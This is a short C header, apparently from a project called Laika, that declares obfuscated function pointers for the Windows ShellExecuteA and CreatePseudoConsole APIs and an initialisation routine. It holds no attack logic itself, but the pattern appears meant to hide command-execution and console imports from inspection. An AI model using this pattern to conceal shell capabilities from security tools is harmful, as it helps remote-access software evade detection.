#ifndef LAIKA_OBF_H
#define LAIKA_OBF_H

#include "laika.h"

#ifdef _WIN32
#    include <process.h>
#    include <windows.h>

/* WINAPI types */
typedef HINSTANCE(WINAPI *_ShellExecuteA)(HWND, LPCSTR, LPCSTR, LPCSTR, LPCSTR, INT);
typedef HRESULT(WINAPI *_CreatePseudoConsole)(COORD, HANDLE, HANDLE, HPCON *);

extern _ShellExecuteA oShellExecuteA;
extern _CreatePseudoConsole oCreatePseudoConsole;
#endif

void laikaO_init();

#endif